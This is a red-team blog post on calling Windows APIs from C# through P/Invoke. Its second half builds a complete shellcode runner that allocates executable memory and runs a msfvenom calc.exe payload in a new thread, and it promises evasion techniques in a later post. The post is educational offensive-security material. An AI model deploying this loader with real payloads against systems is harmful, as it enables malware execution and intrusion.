---
title: "WinAPI and P/Invoke in C#"
author:
  name: crypt0ace
  link: https://twitter.com/crypt0acee
date: 2022-08-31
description: "In this blog we will discuss C# and how we can leverage WinAPI in it."
tags: [Red Team]
---

## Introduction
C# can be a very useful language to start building your initial red team toolkit in. Understandably, it does not provide the covert-ness (not sure if thats an actual word) that we can use in languages like C or C++. But it has other aspects like in memory execution and with the increase in tools that use C# we have also seen some cool tactics that can be utilized to bypass detection and defenses in out red team engagements.
<br>
This blog post will cover basics of using our managed code so we can run Windows API calls. But we should first know what managed and unmanaged code means.

## Managed and Unmanaged Code
C# is a Object Oriented language that is based on the .NET Framework which is made by Microsoft. The syntax is quite easy to understand and learn. There are two general terms which you will hear:
1. Unmanaged Code.
2. Managed Code.

In case of unmanaged code, as Microsoft says, the programmer is in-charge or everything. Everything from memory management, garbage collection, exception handling and security considerations like protections from buffer overflow attacks is the headache of the programmer. It compiles directly into native language that the OS can run directly and also provides low level access to programmer.
<br>
For managed code, the code managed by a CLR (Common Language Runtime) in the .NET Framework. The CLR takes the code and compiles into intermediate language known as IL. It is then compiled by the runtime and executed. It also provides automatic memory management, security protections, garbage collection and exception handling etc.
For better understanding, take a look at this picture.
<br>
![Managed and Unmanaged Code](/assets/img/WinAPI-PInvoke/managed-unmanaged-code.png)
<br>
When using C#, sometimes we need to access the power of unmanaged code from our managed code. We can create a bridge between managed and unmanaged code of ours thanks to the functionality of interopability that the CLR provides. This interopability is made possible with the use of P/Invoke!

## P/Invoke
Platform Invoke or otherwise known as P/Invoke is what helps us use unsafe or unmanaged code from unmanaged libraries into our managed code. According to Microsoft, *P/Invoke is a technology that allows you to access structs, callbacks, and functions in unmanaged libraries from your managed code. Most of the P/Invoke API is contained in two namespaces: `System` and `System.Runtime.InteropServices`. Using these two namespaces give you the tools to describe how you want to communicate with the native component.* 

## Using WinAPI to call a MessageBox
Let's look at an example. We can take a unmanaged API call like `MessageBox` and see what sytax it uses.
<br>
![MessageBox Function](/assets/img/WinAPI-PInvoke/messagebox.png)
<br>
We can see some things dont make sense here. We dont have `HWND` or `LPCTSTR` in C# that we can use. For this we can convert the data types to something we are familiar in C#. A data type conversion chart is found [here](https://posts.specterops.io/offensive-p-invoke-leveraging-the-win32-api-from-managed-code-7eef4fdef16d). This post by [Matt Hand](https://twitter.com/matterpreter) at SpecterOps is also pretty great at explaining the same things I'm rambling about. The chart mentioned in the blog is:
<br>
![WinAPI Data Conversion](/assets/img/WinAPI-PInvoke/WinAPI.png)
<br>
So if we take this in account we can have something similar to this
```csharp
int MessageBox(
  IntPtr    hWnd,
  string lpText,
  string lpCaption,
  uint    uType
);
```
But how do we actually use it? We need to use the `DllImport` to import the DLL which has the unmanaged code for us to use. We can find what DLL we have to use form the Microsoft Docs about the `MessageBox` function. For us it is the `User32.dll`. We can import this DLL by using
```csharp
[Dllimport("user32.dll")]
public static extern MessageBox(IntPtr hWnd, string lpText, string lpCaption, uint uType);
```
In line 2 of the above code, we mention the `extern` or external code that we want to use (`MessageBox`) with the syntax that we converted earlier.
Putting all this together we get:
```csharp
// First we use the two namespaces that Microsoft mentioned.
using System;
using System.Runtime.InteropServices;

namespace demo
{
  class Program
  {
    // Here we import our DLL that holds our `MessageBox` Function.
    [DllImport("user32.dll")]
    public static extern int MessageBox(IntPtr hWnd, string lpText, string lpCaption, uint uType);

    static void Main(string[] args)
    {
      // Now we can call it using our required parameters.
      MessageBox(IntPtr.Zero, "Hey there!", "Hello from P/Invoke!", 0);
    }
  }
}
```
When we compile and run it:
<br>
![MessageBox Executed](/assets/img/WinAPI-PInvoke/MessageBox-Executed.png)
<br>
Voila! WinAPI accomplished!

## Creating a Shellcode Runner
Now that we know how to pop a message box using WinAPI let's discuss how we can use it to make a simple shellcode loader. Too fast? You are free to do some research and explore the WinAPI more and then follow along later. This post considers that you already have some understanding of C# and it's syntax so I'm just going to dive in.
<br>
As from before, we will need to know the imports we are making. For our simple shellcode runner, we need 3 APIs. `VirtualAlloc` to allocate memory, `CreateThread` to, you guessed it, create a thread and `WaitForSingleObject` to wait for the thread to exit. We can import them as:
```csharp
[DllImport("kernel32.dll")]
public static extern IntPtr VirtualAlloc(IntPtr lpAddress, int dwSize, UInt32 flAllocationType, UInt32 flProtect);

[DllImport("kernel32.dll")]
public static extern bool VirtualFree(IntPtr lpAddress, int dwSize, UInt32 dwFreeType);

[DllImport("kernel32.dll")]
private static extern IntPtr CreateThread(UInt32 lpThreadAttributes, UInt32 dwStackSize, UInt32 lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId);

[DllImport("kernel32.dll")]
private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
```
The syntax is taken from the Microsoft Docs and is converted using the Data Conversion photo from [Matt Hand](https://twitter.com/matterpreter).
<br>
Now before going into the Main method and start working in the shellcode, we need to create some enums. These enums will hold our data that will remain constant. In the first import `VirtualAlloc` we can see two things, `flAllocationType` and `flProtect`. According to the Microsoft Docs of this function, the first is the memory allocation type and the other is the memory protection for the region of pages to be allocated. What we need is the memory allocation type to be `MEM_COMMIT` to commit the memory space and the protection to be `PAGE_EXECUTE_READWRITE` so we can put our shellcode in and then execute it. So for these two we can create enums.
```csharp
public enum TYPE
{
  MEM_COMMIT = 0x00001000
}

public enum PROTECTION
{
  PAGE_EXECUTE_READWRITE = 0x40
}
```
Now on to our Main method. We can start by initializing a C# byte array of our payload. For simplicity, I will be using a simple `msfvenom` generated payload that pops calculator.
```csharp
// msfvenom -p windows/exec CMD=calc.exe -f csharp
byte[] buf = new byte[193] {
      0xfc,0xe8,0x82,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30,
      0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,
      0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf2,0x52,
      0x57,0x8b,0x52,0x10,0x8b,0x4a,0x3c,0x8b,0x4c,0x11,0x78,0xe3,0x48,0x01,0xd1,
      0x51,0x8b,0x59,0x20,0x01,0xd3,0x8b,0x49,0x18,0xe3,0x3a,0x49,0x8b,0x34,0x8b,
      0x01,0xd6,0x31,0xff,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf6,0x03,
      0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe4,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,
      0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,
      0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x5f,0x5f,0x5a,0x8b,0x12,0xeb,
      0x8d,0x5d,0x6a,0x01,0x8d,0x85,0xb2,0x00,0x00,0x00,0x50,0x68,0x31,0x8b,0x6f,
      0x87,0xff,0xd5,0xbb,0xf0,0xb5,0xa2,0x56,0x68,0xa6,0x95,0xbd,0x9d,0xff,0xd5,
      0x3c,0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,0x47,0x13,0x72,0x6f,0x6a,
      0x00,0x53,0xff,0xd5,0x63,0x61,0x6c,0x63,0x2e,0x65,0x78,0x65,0x00 };
```
As that is sorted now we can use our APIs to execute it. First we use `VirtualAlloc` to allocate some memory for our shellcode. The address is going to be zero because we are just starting it, the size needs to be equal to the size of shellcode, aloocation needs to be `MEM_COMMIT`, and the protection should be `PAGE_EXECUTE_READWRITE`. So this becomes:
```csharp
int shellcode_size = buf.Length;
IntPtr init = VirtualAlloc(IntPtr.Zero, shellcode_size, (UInt32)TYPE.MEM_COMMIT, (UInt32)PROTECTION.PAGE_EXECUTE_READWRITE);
```
Now that the memory space is allocated we can use `Marshal.Copy` to put our shellcode in the place. It takes 4 arguments, The byte array of our shellcode, the starting index, the destination and the size.
```csharp
Marshal.Copy(buf, 0, init, shellcode_size);
```
Next step is to execute the shellcode. We do that by using `CreateThread`. Before it we need to initialize some things for it to use. Then we can use it as:
```csharp
IntPtr hThread = IntPtr.Zero;
UInt32 threadId = 0;
IntPtr pinfo = IntPtr.Zero;

hThread = CreateThread(0, 0, (UInt32)init, pinfo, 0, ref threadId);
```
Lastly we will use `WaitForSingleObject` to make our thread wait for infinite number of time.
```csharp
WaitForSingleObject(hThread, 0xFFFFFFFF);
```
When we put all of that together we get:
```csharp
using System;
using System.Runtime.InteropServices;

namespace demo
{
  class Program
  {
    [DllImport("kernel32.dll")]
    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, int dwSize, UInt32 flAllocationType, UInt32 flProtect);

    [DllImport("kernel32.dll")]
    public static extern bool VirtualFree(IntPtr lpAddress, int dwSize, UInt32 dwFreeType);

    [DllImport("kernel32.dll")]
    private static extern IntPtr CreateThread(UInt32 lpThreadAttributes, UInt32 dwStackSize, UInt32 lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId);

    [DllImport("kernel32.dll")]
    private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);


    static void Main(string[] args)
    {
      byte[] buf = new byte[193] {
      0xfc,0xe8,0x82,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30,
      0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,
      0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf2,0x52,
      0x57,0x8b,0x52,0x10,0x8b,0x4a,0x3c,0x8b,0x4c,0x11,0x78,0xe3,0x48,0x01,0xd1,
      0x51,0x8b,0x59,0x20,0x01,0xd3,0x8b,0x49,0x18,0xe3,0x3a,0x49,0x8b,0x34,0x8b,
      0x01,0xd6,0x31,0xff,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf6,0x03,
      0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe4,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,
      0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,
      0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x5f,0x5f,0x5a,0x8b,0x12,0xeb,
      0x8d,0x5d,0x6a,0x01,0x8d,0x85,0xb2,0x00,0x00,0x00,0x50,0x68,0x31,0x8b,0x6f,
      0x87,0xff,0xd5,0xbb,0xf0,0xb5,0xa2,0x56,0x68,0xa6,0x95,0xbd,0x9d,0xff,0xd5,
      0x3c,0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,0x47,0x13,0x72,0x6f,0x6a,
      0x00,0x53,0xff,0xd5,0x63,0x61,0x6c,0x63,0x2e,0x65,0x78,0x65,0x00 };

      int shellcode_size = buf.Length;
      IntPtr init = VirtualAlloc(IntPtr.Zero, shellcode_size, (UInt32)TYPE.MEM_COMMIT, (UInt32)PROTECTION.PAGE_EXECUTE_READWRITE);
      Marshal.Copy(buf, 0, init, shellcode_size);
      IntPtr hThread = IntPtr.Zero;
      UInt32 threadId = 0;
      IntPtr pinfo = IntPtr.Zero;
      hThread = CreateThread(0, 0, (UInt32)init, pinfo, 0, ref threadId);
      WaitForSingleObject(hThread, 0xFFFFFFFF);
    }
    
    public enum TYPE
    {
      MEM_COMMIT = 0x00001000
    }

    public enum PROTECTION
    {
      PAGE_EXECUTE_READWRITE = 0x40
    }
  }
}
```
Compiling and running it gives us:
<br>
![Popped Calc.exe](/assets/img/WinAPI-PInvoke/calc.png)
<br>
We get our shellcode running and poping calculator.

## Conclusion
This was a small introduction to Windows API and C# and how we can use both of them to create red team tools for ouir use. This is however very basic and will get detected or blocked. In the next post I'll mention some methods we can use to enhance this and make something that would help us bypass certain type of defenses.

## References
Thanks to all of these which I heavily referenced from.
- [CLR Execution Model](https://stackoverflow.com/a/53894340)
- [Managed VS. Unmanaged Code](https://www.geeksforgeeks.org/difference-between-managed-and-unmanaged-code-in-net/)
- [Managed Code - Microsoft](https://docs.microsoft.com/en-us/dotnet/standard/managed-code)
- [Operational Challenges in Offensive C#](https://posts.specterops.io/operational-challenges-in-offensive-c-355bd232a200)
- [Working with WIN32 API in .NET](https://www.c-sharpcorner.com/article/working-with-win32-api-in-net/)
- [P/Invoke](https://www.pinvoke.net/)
- [Offensive P/Invoke: Leveraging the Win32 API from Managed Code](https://posts.specterops.io/offensive-p-invoke-leveraging-the-win32-api-from-managed-code-7eef4fdef16d)
- [Red Team Tactics: Utilizing Syscalls in C# - Prerequisite Knowledge](https://jhalon.github.io/utilizing-syscalls-in-csharp-1/)